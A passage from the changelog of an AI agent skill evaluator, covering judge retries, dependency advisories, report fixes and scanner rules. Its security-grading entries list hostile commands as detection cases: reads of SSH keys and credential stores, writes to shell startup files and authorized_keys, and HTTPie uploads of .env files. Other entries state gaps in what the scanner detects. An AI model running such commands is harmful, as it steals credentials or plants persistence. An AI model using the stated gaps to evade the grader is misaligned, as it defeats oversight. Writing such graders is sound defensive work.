  or the shared base image when `harbor.base_image_mode` is `reuse`.

- A `tier3 evaluate --skip-with-skill` run with two or more agents now records
  the dataset-size status in `result.json` and the `tier3 evaluate` summary. It
  is taken from the agent with the best baseline score, as in the reports.

- `rubric-eval` now asks the judge once more, naming the problem, when its
  reply is not valid JSON or its criterion evidence cannot be scored: a
  criterion is missing, repeated or unknown, or has a score outside 0 to 10 or
  a pass flag that is not a boolean. In 0.8.0 the first such reply failed
  Tier 1 with a HIGH `llm_invalid_response` or `llm_unavailable` finding; now
  only a second one does. The LLM client still retries transient provider
  errors as set by `SKILL_EVAL_LLM_MAX_RETRIES`; a request that still fails
  after those retries, a refusal or a truncated reply is not asked again. The
  JSON report records `judge_attempts`, the number of times the judge was
  asked (1, or 2 after a rejected reply, not counting the client's retries),
  in the skill's `rubric_eval` success detail or `llm_*` finding and, for a
  single skill, also in the `rubric_eval` object. It is left out when the
  first request fails, for example with no provider configured. Rejection
  diagnostics redact judge-supplied credentials before shortening the reason,
  and collapse whitespace and controls to printable single-line text in logs,
  retry notes and final invalid-response findings and summaries.

- A default Tier 3 run with a baseline can reach a PASS or NEUTRAL publication
  verdict in BENCHMARK.md again. The baseline arm has no skill under test, so
  it records `skill_execution` and `skill_efficiency` as not applicable and has
  no Discoverability or Efficiency baseline. The publication check treated
  those two dimensions as missing evidence and compared Skill Lift with the
  five-dimension score, so those cards said INCOMPLETE instead. Discoverability
  and Efficiency now count as not applicable for the baseline when it recorded
  their skill metrics that way, and Skill Lift is checked over the dimensions
  both arms scored. On the card those two rows say `baseline N/A` instead of
  `baseline not run`. Any other missing or inconsistent baseline still makes
  the card INCOMPLETE.

- `BENCHMARK.md` no longer publishes an Overall uplift that disagrees with
  `lift.json` and the JSON, HTML, Markdown and terminal reports when a metric is
  N/A in only one arm. The Overall row now shows the two scores the published
  Skill Lift subtracts, which the canonical report records per agent as
  `lift_overall`, and notes when they differ from the arm overall scores. A
  cross-format test reconciles Overall and lift across every output of one run.

- The `dependency` check now reports each pip-audit and Safety advisory as a
  `DEPENDENCY` finding named by its advisory ID, at the requirements file and
  line, or the `pyproject.toml`, that pins the package. In 0.8.0 an advisory
  was only an error string such as `[CVE-HIGH] pyyaml==5.3: ...`: it failed
  the run, but JSON `findings`, the severity counts and SARIF results left it
  out, and a policy overlay could not change its severity. The finding
  metadata binds the scanned version to the declared exact pin, or marks a
  Safety advisory that matches no audited pin `unbound`, and records the
  advisory source, fixed versions, aliases, and a runtime, dev, test, docs, or
  build role from the requirements file name or optional group. Safety's
  severity now also comes from the CVSS object it prints with an API key, so
  a CVSS 9.8 advisory is `critical` and fails the run, and a score that is
  not a number from 0 to 10 is skipped; in 0.8.0 that object stopped the
  check with an `AttributeError`. A Safety advisory that
  pip-audit already reported under the same ID or CVE is not repeated. Safety
  JSON with a null `severity` or a top-level list, and a pip-audit advisory
  with a null `severity`, no longer stop the check with an `AttributeError`.
  A Safety `advisory` that is a number or null no longer stops it with a
  `TypeError`, and one that is an object no longer stops it with a
  `KeyError`. A pin on the line after a comment line that ends in a
  backslash is now audited; in 0.8.0 it was read as part of the comment, even
  though `pip install -r` installs it. A critical advisory does not stop a
  folder run before the remaining skills are audited. Line numbers in
  findings and warnings now count only line breaks an editor shows, so
  `--hash` continuation lines or a form feed before a pin no longer shift
  them. For every check, the CLI report now lists warnings that no finding
  repeats next to the findings, the Markdown report does so for an
  `INCOMPLETE` check without an error, escaping HTML in them as it does in
  errors, and a policy overlay that changes a finding's severity keeps those
  warnings, so the reason a scan is `INCOMPLETE` stays visible.

- Tier 3 dataset summaries honor explicit `should_trigger` routing labels before
  legacy `expected_skill` values. Report insights distinguish unavailable trial
  scores from scored attempts that miss the pass threshold. Dataset snapshots
  use schema 1.1; valid schema 1.0 snapshots retain their original datasets and
  integrity checks, with corrected summaries projected without rewriting files.

- The JSON report of `skillevaluator validate`, `tier1` or `tier2` on one skill
  folder lists that skill in `skills` and under its author in `contributors`.
  A clean run with a narrowed check list, such as `--checks schema`, has no
  finding path or quality score to name the skill by, so the report listed one
  skill per check ID (`manifest_exists`, `frontmatter_valid` and so on). It
  now uses the folder's name. The `BENCHMARK.md` of a run without a recorded
  Tier 3 version, such as `--tiers 1`, now records the evaluator version
  instead of `Evaluator version: not recorded (legacy or non-live result)`; a
  version recorded by a Tier 3 run still wins.

- `skillevaluator tier1 .` and `tier2 .`, run from inside the skill folder, name
  the skill in the JSON `skills` and `contributors` lists, as `tier1 <folder>`
  does. The report took the name from the path as typed, which is empty for
  `.`, so a clean run with a narrowed check list, such as `--checks pii`,
  listed no skill or one skill per check ID. The JSON that CI retains records
  the skill's path relative to the repository root as `target_path`, no longer
  the absolute path of the runner's workspace.

- Tier 3 improvement recommendations respect each case's expected skill routing:
  passing negative controls no longer inherit activation-loss advice from positive
  cases, while failed negatives retain task, environment, and run-error diagnostics.
  The dataset snapshot is read once per recommendation pass across all cases and agents.

- Tier 2 includes qualifying shell comment blocks at end of file in context
  deduplication. Previously those blocks disappeared unless a blank line or
  code followed them, which could hide repeated guidance across shell files.
- Tier 3 decodes the native Codex `exec` wrappers that Codex 0.161.0 emits:
  inline `text(await tools.NAME(...))`, single-quoted string literals, and
  literal `Promise.allSettled` batches rendered by an indexed `for`, indexed
  `forEach`, or `forEach(text)`. Multi-call wrappers decode only when each call
  owns its own JSON record of the outer output; dynamic arguments, shadowed
  bindings, unsupported renderers, and missing, extra, reordered, or truncated
  records, including duplicate JSON keys, remain unsupported. A nonzero exit
  code or rejected promise in a record is graded as a failure. This restores
  security and skill-execution scoring for those wrappers instead of the
  neutral fallback.

- All-tier CI retains Tier 2's native reports as advisory while preserving
  failed and incomplete evaluation outcomes. GitHub `ci status` validates the
  pinned evaluation and feedback configuration before reporting readiness,
  including malformed YAML and missing approval inputs. Candidate onboarding
  pins include the reviewed CI fixes and matching runtime metadata.
  Use the verified released Tier 1 image so valid multi-valued `metadata.domain`
  fields also work in new all-tier consumers.

- Private native Claude Code staging keeps the source client's skill
  declarations: Codex paths that Codex ignores are no longer copied into the
  staged `plugin.json` (where Claude Code rejected or loaded them), and
  undotted Cursor skill roots become `./` paths Claude Code accepts.

- Tier 3 security grading now finds credential reads and protected-file writes
  however the path names the home directory: `/home/<user>`, `/Users/<user>`,
  `/root`, `$HOME`, `${HOME}`, `~user`, or `C:\Users\<user>`, also with `//`,
  `/./`, or `dir/..` segments. In 0.8.0, `cat /home/agent/.ssh/id_rsa`,
  `cat $HOME/.ssh/id_rsa`, a `Read` of `/home/agent/.ssh/id_rsa`, and
  `echo x >> /home/agent/.bashrc` scored Security 1.0, because only the
  literal `~/` and `/root/` forms matched; they now score 0.0. More
  credential stores are checked (`~/.aws/config`,
  `~/.azure`, `~/.kube/config`, `~/.docker/config.json`, `~/.netrc`,
  `~/.git-credentials`, `~/.config/gh/hosts.yml`, `~/.pypirc`, `~/.npmrc`); as
  with `~/.ssh`, a command that only names one, such as
  `kubectl --kubeconfig ~/.kube/config get pods`, now scores 0.0 too. Writes
  to `~/.bash_profile`, `~/.zprofile`, `~/.config/fish/config.fish`,
  `~/.ssh/authorized_keys`, `~/.gitconfig`, and the Claude Code, Codex, and
  OpenCode settings in the home directory are checked as well. A shell
  command writes one of these files, or a home spelling of a file 0.8.0
  already protected, when the file is the target of a redirection, `tee`, or
  `sed -i`, so reads such as `cat ~/.gitconfig 2>/dev/null` and
  `source ~/.bashrc && cp dist/app.js "$OUT_DIR/"` keep 1.0. As 0.8.0 does
  for `~/.bashrc`, text that only holds such a write also scores 0.0, such as
  a here-document that writes a README containing `echo x >> ~/.zprofile`.
  The 0.8.0 rule for `~/.bashrc`, `/etc/sudoers`, and the other files it
  protected is unchanged and still runs first, so every command that scored
  0.0 in 0.8.0 still does. Both the host checker and the bundled Harbor
  verifier apply the fix.

- Treat empty and placeholder `expected_script` values as no script expectation,
  and ignore placeholder-only expected behavior entries when grading datasets.

- Tier 3 security findings no longer keep credentials from the agent's
  commands, the user prompt, or the agent's response in their `evidence`,
  which is saved in `skill_evaluator_reward.json`, the collected results, and
  the reports. In 0.8.0 a sensitive-path or sensitive-file-write finding stored
  the whole command or tool input, such as
  `echo 'export OPENAI_API_KEY=...' >> ~/.bashrc`; destructive-command,
  prompt-injection, and refusal findings stored their text unmasked; and
  network findings masked only known key shapes, so a `curl -u user:password`
  value was kept. Path findings now record the protected entry they matched,
  such as `~/.bashrc`, and the longest one when several match, so a write to
  `/etc/profile.d/npm.sh` records `/etc/profile.d`. The other findings mask, as
  a best effort, private key blocks, URL user info (also a password that holds
  an `@`), `Authorization`, API-key, and `Cookie` header values (including
  quoted and shell-escaped cookie values), credential flags and assignments
  (also a double-quoted value with an escaped quote, and a value on a
  backslash-continued line), `.netrc` passwords, and common token prefixes, and
  keep the rest of the command readable; a backslash-newline is joined, as in a
  shell, so a continued command shows as one line. A credential in another
  form, such as a `.pgpass` line, can still appear. Scores are unchanged.
  Because path findings name the entry, the without-skill baseline comparison
  now matches them by entry: a with-skill write to `~/.bashrc` is attributed to
  the baseline prompt or environment when the baseline also wrote to
  `~/.bashrc`, whatever each command wrote. Both the host checker and the
  bundled Harbor verifier apply the fix.

- Read JSON, JSONL and YAML evaluation datasets as UTF-8 so Unicode prompts and
  answers load correctly on hosts with a non-UTF-8 default text encoding.

- Grader qualification resolves verifier source paths before provenance hashing,
  so source-directory aliases (including macOS `/tmp`) retain the same relative
  file identities and hashes while files outside the source root are rejected.

- A Tier 1 security scan no longer stops as `INCOMPLETE` with `skillspector
  JSON field 'analysis_completeness' reports incomplete analysis (status
  'partial')` when the skill's instructions name a file that SkillSpector did
  not scan, such as a file the skill writes at run time or a source file
  elsewhere in the repository. SkillSpector v2.12.0 to v2.13.3 record such a
  reference as a nonfatal `reference_missing` row, and v2.10 and v2.11 as
  `reference_unresolved`. When these references are the report's only gaps, or
  the only gaps besides accepted referenced images, the scan now passes with a
  warning that names the file and line of up to three of them. A v2.13.3
  report whose only gaps are such references, which the missing-path reference
  caveat above accepts from the report alone, now also has to meet the
  conditions below whenever the scan has a known target, as through
  `validate`, `tier1` or `security-scan`, and it keeps that caveat instead of
  this warning. Each row must be in a regular, single-link file that the
  report lists once and that is inside the skill and not reached through a
  symlink, and the report's `references` list must record a `missing`
  reference on that line. The line must not name a symlink, a file the report
  does not list, a directory left out of the scanned copy, such as `versions/`
  or `node_modules/`, anything in it, or a directory that holds any of these,
  also after Markdown escapes, character references and percent-escapes are
  decoded, or through a shell glob, expansion or quotes, a zsh group, numeric
  range, globbing flag or `EXTENDED_GLOB` operator, a bash extended glob, a
  cmd.exe `^` escape, variable or batch parameter such as `%DIR%`, `!DIR!` or
  `%~dp0`, a PowerShell backtick escape, a `\` separator or a Windows 8.3
  short name such as `NODE_M~1`. Only that line is read, and a command in it
  is not run, so a name on another line or one that a command prints, such as
  the output of a span in backticks, is not detected: the check keeps an
  instruction that names a left-out file `INCOMPLETE`, but does not catch a
  skill written to hide one. Inside `.git`, Git's own files and directories,
  such as `HEAD`, `config` or `refs`, do not count, but hooks other than
  `*.sample` templates and any other file there do. A lone file such as
  `SKILL.md` is scanned on its own, so a line that names a file beside it
  keeps the scan `INCOMPLETE`. Tier 3 output in the default
  `<skill>/evals/results` location, such as `results`, `report.html` or
  `summary.json`, or with `--harbor-keep-jobs` a copy of every bundled file,
  counts as not inspected too, so a line that names it keeps the scan
  `INCOMPLETE` after a Tier 3 run, although it passed before. Keeping results
  outside the skill with `--results-dir` or `SKILLEVALUATOR_RESULTS_DIR`
  avoids that. Every missing reference in a skill scanned on its own inside a
  folder or plugin, such as `security-scan` or `validate` on a folder of
  skills, or `validate` on a plugin, also keeps that skill's scan
  `INCOMPLETE`. A reference that matches several bundled files
  (`reference_unresolved` from v2.12.0), a fatal or other ledger row, an
  uninspected file, a degraded analyzer, a limitation, or fewer findings
  counted after filtering than before still leaves the scan `INCOMPLETE`.
  Every missing reference must match an accepted ledger location; ambiguous
  references, unknown completeness fields and truncated evidence remain
  `INCOMPLETE`. Nonfatal exclusions must name real uninspected paths. Line
  checks retain standalone shell wildcards and recognize escaped spaces, and
  accepted-reference warnings survive static/LLM finding deduplication. A
  refused reference includes a short acceptance hint and documentation link.

- Estimate Tier 1 instruction tokens from the parsed Markdown body, so `---`
  inside YAML values or comments does not count frontmatter as instructions.
  Body separators without valid frontmatter no longer produce a spurious estimate.

- A Tier 1 security scan with SkillSpector v2.13.4 or later no longer stops as
  `INCOMPLETE` with `skillspector JSON field 'analysis_completeness.status' is
  not recognized` when the skill's instructions name a file that the skill
  does not bundle. These releases report such a scan as
  `complete_with_caveats` instead of `partial`. SkillEvaluator now accepts the
  caveats under the same conditions as the missing references above and shows
  the same missing-reference warning, and checks the report's findings as in
  any other complete scan. A caveat that fails one of those conditions, such
  as a line that names a file left out of the scanned copy, leaves the scan
  `INCOMPLETE` and, as for a `partial` report, still reports the findings.
  Unlike the v2.13.3 missing-path reference caveat, these caveats are never
  accepted from the report alone, so they leave a scan without a known target
  `INCOMPLETE`, and an accepted report carries no
  `skillspector_reference_caveats` entry. A report with that status and no
  caveat, or with a caveat that is not a nonfatal `reference_missing` row in
  phase `reference_resolution`, is not trusted: the scan is `INCOMPLETE`
  without its findings, as with `complete_with_caveats` from an earlier
  release.

- A PII finding no longer keeps its `evidence_sha256` after CI redaction masks
  a credential inside the value the finding reports. In 0.8.0 the finding kept
  the digest of the unmasked value, so anyone holding the redacted report could
  confirm a guess for the masked part. Redaction now removes a digest that no
  longer matches the reported value.

- Truncated `--llm-verify` replies with no complete verdicts no longer claim an
  answering model. Complete verdicts still retain their model, and other LLM
  parsers can still accept an empty result as complete evidence.

- Tier 2 context deduplication now checks each chat-LLM verdict before it
  becomes a finding. When present, the confidence must be a JSON number from 0
  to 1, and the rationale and suggestion must be strings of at most 8,192
  characters; a missing confidence still reads as 0, and a missing rationale or
  suggestion as empty. In 0.8.0 any value that `float()` accepted was used: a
  confidence of `85` or `true` made a HIGH finding, and the string `"NaN"` made
  a MEDIUM finding whose `NaN` confidence then stopped the JSON and SARIF
  reports from rendering. A list or object in a text field reached the finding
  unchanged. Such a reply now counts as a failed analysis, so the scan is
  reported as incomplete, like any other malformed reply. The checks apply to
  every verdict, including `INTENTIONAL_DETAIL` and `RELATED_BUT_DISTINCT`,
  which never become findings: a skill that passed on 0.8.0 with such a reply,
  for example one with a `null` suggestion or a `"0.9"` string confidence, is
  now reported as incomplete, and so is a `DUPLICATE` reply with a `"0.9"`
  confidence, which made a HIGH finding in 0.8.0.

- Tier 2 context deduplication now accepts more content chunks per skill. With
  NVIDIA Build's default embedding model (`nvidia/nemotron-3-embed-1b`, 2,048
  dimensions) and the OpenAI-compatible default
  (`nvidia/nvidia/nemotron-3-embed-1b`, the same model) the limit is now 724
  chunks, and with OpenAI's default `text-embedding-3-small` (1,536
  dimensions) it is 836. All three were 512. In 0.8.0 a skill with more than
  512 chunks stopped the scan as incomplete with `chunk_count_limit`, and
  `validate` exited 1 because Tier 2 gates by default. The chunk ceiling is now
  1,024 and the scalar-comparison budget 536,346,624, so embeddings of up to
  1,024 dimensions reach all 1,024 chunks. At 3,072 dimensions the limit is now
  591, and at 4,096 it is 512, up from 418 and 362. A skill above its width's
  limit but within 1,024 chunks, such as 725 to 1,024 chunks with either
  2,048-dimensional default, now stops after the first embedding batch with
  `scalar_comparison_limit` instead of before any embedding request with
  `chunk_count_limit`. It is still reported as incomplete, with the same exit
  code. The cluster member limit follows the chunk ceiling to 1,024. The most
  clustering work one skill can need doubles with the budget, and the most
  embedding input it can send doubles with the ceiling, from 512 to 1,024
  texts (724 with either 2,048-dimensional default).

- Tier 3 HTML evaluator cards now say when a judge metric's lift left out cases
  whose arms were scored by different judge models, for example after a judge
  fallback in one arm. The arm scores keep those cases, so a card could show
  Baseline 0.20 and With skill 0.50 next to a -0.40 lift with nothing
  explaining the gap. The card now notes `Lift leaves out 1 case scored by
  different judge models; the arm scores include it.`, or says that no
  comparable result remains when the card has no lift, and labels those cases
  `Left out of lift: different judge models` in its per-trial evidence. In the
  canonical JSON the evaluator records the count in `lift_excluded_cases`, its
  card lists the cases in `comparison_basis`, and the matching evidence entries
  carry `comparison_excluded: true`. Scores and lift are unchanged.

- Tier 2 context deduplication now numbers `SHARED CONTENT n` blocks from the
  most repeated text, ties in first-seen order, instead of in first-seen order
  alone. In 0.8.0 a text repeated hundreds of times could get block 10 or later,
  whose references are one character longer. The cluster's request could then
  stay over 64,000 characters and stop the scan as incomplete with
  `llm_prompt_size_limit`, although numbering that text first would have brought
  it within budget. The texts to share are now chosen together to save the most
  characters: a text that saves only a few characters stays inline when sharing
  it would push another text past block 9 and cost more than it saves.

- Tier 2 deduplication no longer rescans a shell script once per function
  header. In 0.8.0 each `name() {` header without a closing brace walked the
  rest of the script, and line numbers were counted from the start of the file
  for every function, so chunking grew with the square of the script's size: a
  53 KiB script of such headers took about 20 seconds, and a 1 MiB one could
  take hours. Braces and line breaks are now indexed in one pass. Python files
  are also split into lines once instead of once per function or class. Chunk
  text and line ranges are unchanged.

- Tier 3 **Measured Agent Resources** no longer count idle or user time as LLM
  seconds when timing is inferred from step timestamps and an agent step with
  tool calls is followed by a user or system step. The whole gap up to that
  step, minus the measured tool time, was charged to the model, so a step with a
  1 s tool call, followed 38 s later by a user step, added 37 LLM seconds. Only
  the agent's next step shows when the model finished with the tool output, so
  such a trial now has no LLM or tool seconds and, like other unmeasured trials,
  leaves its arm's LLM and tool totals `N/A` (`null` in JSON). Native ATIF
  timing is unchanged.

- Tier 3 reports no longer say `baseline not run` for an agent whose baseline
  arm ran but failed, for example after one baseline attempt hit the agent
  timeout. `BENCHMARK.md` now shows that agent's with-skill scores as
  `90.0% — baseline incomplete (1 of 2 attempts scored); uplift unavailable`,
  or `baseline unavailable` when no baseline attempt scored, and keeps
  `baseline not run` for a skipped baseline. An **Agent coverage** list under
  the score table names each failed arm, including a failed with-skill arm,
  with its scored and expected attempts and the first Harbor exception type in
  words, such as `agent timeout error`; the Tier 3 row of the tier status
  table names the agent and arm. The JSON payload records the same facts in
  `coverage_notices`, which the HTML report shows under
  **Agent coverage notes** and the full terminal report
  (`validate --verbose` or `-r cli`) prints in the Tier 3 block, also when
  Tier 3 is non-blocking. The compact default `validate` view leaves them to
  the HTML and JSON reports and `BENCHMARK.md`. A failed arm still fails the
  agent and the run, and the notes say so.

- Tier 3 standard judges under `LLM_JUDGE_RETRY_POLICY=strict` with Bedrock
  as the provider no longer label a Bedrock error that the policy treats as an
  unavailable model, such as throttling, a missing or inaccessible model, or
  an unreachable endpoint, as `Public provider call failed`. Where such an
  error is reported, in a failed judge's `evaluation_errors` reason and in the
  `problem` of its `judge_attempts.json` entry, it now reads
  `Bedrock request failed`, like a Bedrock error that ends the judge and like
  the default `legacy` policy.

- The interactive Tier 3 progress view (`--progress rich`, or `auto` in a
  terminal) now keeps one height for the whole run, so redraws no longer leave
  repeated or jumbled table frames. The Provider and Run plan rows show a
  placeholder until the plan resolves, each row is one line that ends in an
  ellipsis when its value is too long, and stages fill a fixed number of rows,
  at least six and one per agent, showing the most recently updated. The agent
  models, provider and run plan are printed in full above the table whenever
  they change, and the table left on screen when the run ends lists every
  stage, with its full detail when the Detail column is at least 20 columns
  wide. A stopping agent's detail now starts with the second Ctrl+C hint, so a
  cut row still shows it. The view redraws only on progress events and
  heartbeats, no longer also from Rich's own refresh thread. If drawing fails,
  including a terminal write that would block, the table keeps its last frame
  with running stages still shown as running, a line says that the run
  continues, and no further progress is shown for that run; the final results
  still print. When the terminal also refuses that line, or the write that
  shows the cursor again, a line saying that the run went on is printed and
  the cursor is shown when the run ends. Frames the terminal refused are
  dropped then, so they are never drawn over output printed since. Before, a
  failure on the heartbeat thread ended that thread with a traceback and left
  the view active without updating elapsed times, and a failure on the
  caller's thread marked the running stages as failed.

- The Tier 3 terminal summary now shows `N/A`, not `NO SCORE`, as the Skill
  Lift of an evaluator or dimension that is N/A in either arm, as the Markdown
  and HTML reports already do. Most runs with a baseline hit this: Skill
  Execution, Efficiency and Discoverability are N/A in a baseline with no
  skill it could activate, `behavior_check` is N/A when the cases have no
  `assertions` (legacy `expected_behavior`), and `accuracy` and
  `goal_accuracy` when they have no `expected_output` (legacy
  `ground_truth`). In a baseline-only run (`--skip-with-skill`) the lift of
  every other row now reads `skipped`, as the docs and the Markdown report
  say. A lift that is missing for another reason still reads `NO SCORE`. The
  HTML report's Per-Evaluator Drill-Down now shows `N/A`, with the reason on
  hover, instead of `—` for a metric a trial recorded as N/A. The reports'
  reasons for an N/A Accuracy, Goal Accuracy or Behavior Check now name the
  dataset fields `expected_output` and `assertions` before their legacy names.

- Tier 3 no longer scores a with-skill skill metric `1.0` when the eval case
  gives it nothing to score. `skill_efficiency` (Efficiency) is now N/A for a
  negative case, such as the one `create-eval-dataset --full` writes, and both
  `skill_execution` (Discoverability) and `skill_efficiency` are N/A for a case
  that is not negative and names no `expected_skill`, such as a legacy case
  without `expected_skill` and `should_trigger`. The same holds in a baseline
  arm that stages a skill the case could activate. The trial overall, pass@k
  and the arm's averages leave N/A metrics out, so absolute with-skill scores
  of these cases change: a negative case scoring 1.0 on Security and
  Discoverability and 0.8 on Correctness and Effectiveness now has an overall
  of 0.90, not 0.92. If no case is a positive case that names an
  `expected_skill`, for example when every case is negative, Efficiency has no
  with-skill score and the agent cannot PASS; Discoverability has none either
  unless some case is negative. A trial without a trajectory keeps these
  metrics N/A too. A positive case with no tool calls still scores `0.0`, and
  Skill Lift is unchanged when the baseline has no skill it could activate,
  because both metrics are already N/A there. The HTML report now explains a
  with-skill N/A skill metric by the eval case, not by a missing skill, and a
  multi-step trial's collected reward keeps the N/A reason its steps' verifier
  recorded.

- The per-arm Tier 3 applicability table reflects negative-case Efficiency N/A
  and the expected-skill requirement for positive-case skill metrics.

- Tier 3 baseline N/A explanations cover case-level applicability when a staged
  skill is available, including negative cases, instead of claiming no skill is
  installed. Dimension tooltips use the same explanation as evaluator summaries.

- `skillevaluator tier3 feedback` now writes the evaluated skill's directory
  (known from `--skill` or a run in the skill's `evals/results`) as its name and
  the home directory as `~` in the evidence it sends to the LLM, so an error
  naming the skill's `SKILL.md` no longer shows its local path. A copied run's
  path starting with `~user/` or `$HOME/` is now also replaced with the run ID.
  Path masking now leaves a URL unchanged, even when its query or fragment names
  a local path, unless its scheme is `file:` or ends in `+file:`, such as
  `git+file:`. The URL ends at whitespace, a quote, `<`, `>`, a backtick, `^`,
  `{`, `|`, `}`, or an ANSI escape, at a `\n`, `\r`, or `\t` escape, and before
  an absolute path or another scheme after a `,` or `;` (also with a name such
  as `LOG=` or `--find-links=`) or a Markdown `](`, so a run, skill, or home
  path after it in minified JSON, on the next line of an escaped env dump, or in
  a `,`- or `;`-separated list is still masked, and so is a `file:` URL after
  it. A Windows path in a URL is kept, also with a folder whose name starts with
  `n`, `r`, or `t`, such as `\runs\` or `\t\`, unless that name holds a
  character other than a letter, a digit, `_`, `.`, `~`, `$`, `%`, or `-`, such
  as `\runs(old)\`, or no backslash follows it, as in `\notes.txt`; the URL then
  ends there. A copied run's path right after a `\n`, `\r`, or `\t` escape or an
  ANSI code, such as a color or erase-line code, is now replaced with the run
  ID, and the escape or code is kept, also with no URL before it. 0.8.0 sent
  such a path as is after a word, as in `done.\n/srv/...`, or after a raw ANSI
  code, and replaced an escape or an escaped code with it otherwise. A relative
  path after such an escape is no longer read as an absolute one. A field over
  65,536 characters with no whitespace after its limit now keeps a masked
  prefix, cut at punctuation such as `,` or `}` but never inside a URL's user
  info or host, so `Error: ` followed by minified JSON no longer arrives as
  `Error: ...<truncated>`.

- Tier 3 HTML **Attempt Details** now show an agent timeout that a later
  scored attempt recovered under `--stop-on-pass`, and count it in the case's
  attempts. In 0.8.0 a case that timed out on attempt 1, passed on attempt 2
  and skipped attempt 3 read `1 of 2 scored` and `passed on scored attempt 2`,
  with nothing about the timeout; it now reads `A1: timed out, recovered`,
  `1 of 3 scored` and `passed on attempt 2`. The Result column says
  `passed on attempt N` for every case, because N is the attempt's number, not
  a count of scored attempts. `tier3 evaluate` also prints one line for each
  agent with recovered timeouts. Scores, pass@k and attempt coverage are
  unchanged.

- Tier 3 security grading again warns about network exfiltration, lowering
  the Security score to 0.5, for an HTTPie method word after a capitalized
  `HTTP`, `HTTPS`, or `Http` word in cases that 0.8.0 stopped flagging: the
  `HTTP` word follows a pass-through wrapper or a `$VAR` command word, as in
  `strace -f HTTP POST URL`, or is printed into a pipe by `echo` or `printf`,
  as in `echo HTTP POST URL | sh`, or a brace-expanded `name:@file` header
  item such as `X-Data:{@,}.env` follows it. Both the host checker and the
  bundled Harbor verifier apply the fix. Prose such as
  `Use HTTP POST to create an item.` in a here-document or an unpiped `echo`
  still does not warn.

- `tier3 compare` reads standard-policy Overall lift from `lift.json` when the
  arms have different metric applicability, matching the canonical report.
  Missing lift data is shown as `-`; custom-only and legacy agents retain their
  arm-difference comparison.

- Tier 2 `similarity-check` and context deduplication now parse Markdown
  frontmatter within fixed structure limits: 100 nesting levels, 20,000 nodes,
  1,024 alias references, 1,024 items in one mapping or sequence, 65,536
  characters in one value, and integers up to 14,000 bits, with aliases and
  merge keys counted after expansion. In 0.8.0 both used plain
  `yaml.safe_load`, and `similarity-check` converted a `name` or `description`
  that was not a string to text. A 477-byte `SKILL.md` whose frontmatter chains
  YAML aliases produced an 82-million-character description, and a 543-byte
  one that chains merge keys took 180 MB in context deduplication; each further
  level multiplies the cost by ten. Mapping frontmatter over a limit now stops
  `similarity-check` with an error that names the manifest, and context
  deduplication with a CRITICAL `manifest_complexity_limit` finding, before any
  provider call. Text between the `---` lines that is not a mapping is still
  not frontmatter and is never checked against these limits.
  `similarity-check` now excludes a manifest whose `name`, `title`, or
  `description` is a non-empty value that is not a string, such as `name: 2048`
  or `name: yes`, with the coverage reason `non_string_name_or_description`
  instead of converting the value. Its debug diagnostic omits the absolute
  manifest path, keeping private host-directory names out of logs.
  An empty, zero, or false value such as `0`,
  `false`, or `[]` still gets `missing_name_or_description`. Either way, like
  any excluded manifest, it makes the scan incomplete. It stops with an error
  that names the manifest when a value is longer than 16,384 characters, the
  per-field catalog text limit; description mode still also caps
  `name: description` at 16,384 characters. An invalid tagged value such as
  `!!int ""`, an impossible date such as `2024-02-30`, or a decimal integer
  longer than 4,300 digits (Python's default limit for converting text to an
  integer) now counts as invalid frontmatter instead of stopping either check
  with an unexpected error. A repeated key still keeps its last value in both
  checks. `tier3 select-decoys` and group-mode decoy loading
  (`skill_workspace.decoy_manifest`) read the target's and each selected
  skill's frontmatter the same way. A `name` or `description` that is not a
  string, such as `name: yes`, now fails them with `Decoy selection requires a
  skill with a root SKILL.md whose frontmatter is a valid YAML mapping with a
  non-empty string name and description` instead of being converted to text;
  invalid YAML, such as an unquoted `description: Use when: debugging logs`, and
  an empty value get the same message. Frontmatter over a limit, or a value
  longer than 16,384 characters, fails them with an error that names the
  manifest.

- The Tier 3 verdict is now FAIL when a scored dimension is below 0.40 and
  another dimension has no score. In 0.8.0 a dimension with no score made the
  agent NEUTRAL before the 0.40 check ran. Correctness has no score when no
  case defines `ground_truth`, so an agent with Efficiency 0.1 got a NEUTRAL
  verdict. For such a run the overall verdict in `BENCHMARK.md` is now FAIL
  (was INCOMPLETE). The JSON report's `tier3.verdict` and `publication_status`
  are `fail` (were `neutral` and `incomplete`), and the Tier 3 result's
  `status` is `failed` (was `passed`). The terminal's Tier 3 line reads failed.
  The `--format markdown` report shows publication status FAIL (was
  INCOMPLETE), a Failed count of 1 (was 0) and verdict FAIL (was NEUTRAL). The
  `tier3-benchmark.md` that `tier3 evaluate` writes reads FAIL (was NEUTRAL).
  The HTML Tier 3 card reads `Failed (advisory)` in a default `validate` run,
  and `Changes required` with `--block-on-agent-eval` and in the
  `tier3 evaluate` report, where it read Neutral. The HTML Tier 3 summary opens
  with `Completed-agent result: FAIL` and says other execution failures need
  attention, as it already did for a run with every dimension scored, in place
  of `Verdict at a glance: Neutral`. A dimension with no score still keeps an
  agent from passing, and exit codes do not change. This FAIL also applies when
  every required check passes. A run with a failed required check, such as one
  with a `destructive_command` finding, already gets FAIL from that check (see
  Changed).

## 0.8.0 - 2026-11-05

### Added

- Private runtime runs retain sanitized loading, coverage, MCP, behavior and
  comparison views before cleanup. The saved snapshot supports offline reports
  in all six existing formats, with explicit missing evidence and omissions.
  Public command activation remains deferred.

- `skillevaluator tier3 feedback RUN_DIR [--skill PATH]` opens a terminal chat
  about one completed Tier 3 run. Answers are grounded in that run's scores,
  with-skill and baseline comparisons, every case's attempts with per-metric
  scores, measured agent tokens and seconds, execution errors, and the report's
  saved feedback, without evaluating again or regenerating LLM feedback. It uses
  the configured `SKILL_EVAL_LLM_PROVIDER` and `SKILL_EVAL_LLM_MODEL`, sends the
  run ID instead of the local path, redacts credential-shaped text, and writes
  nothing to disk. No request is sent before the first question. `LLMClient`
  gains `chat(messages)` for multi-turn requests with the same retries and typed
  errors as `completions()`.

- Opt-in `LLM_JUDGE_FALLBACK_POLICY` and `LLM_JUDGE_RETRY_POLICY` for the Tier 3
  standard judges. `LLM_JUDGE_FALLBACK_POLICY=replace` lets only the judge
  model and the `LLM_JUDGE_FALLBACK_MODELS` entries answer, without the
  built-in `claude-opus-4-8` refusal fallback. `LLM_JUDGE_RETRY_POLICY=strict`
  tries at most three models with two requests each within the judge's time
  budget, moves on only when a model is unavailable, ends the judge on a
  refusal or a quota, budget, safety, or security error, and scores only a
  first reply that is exactly one JSON object. Any other value stops a run
  with standard grading before trials start. The defaults, `append` and
  `legacy`, keep the current behavior.

- Rubric evaluation JSON reports name the provider and model that gave each
  score as `llm_provider` and `llm_model_used` in the skill's `rubric_eval`
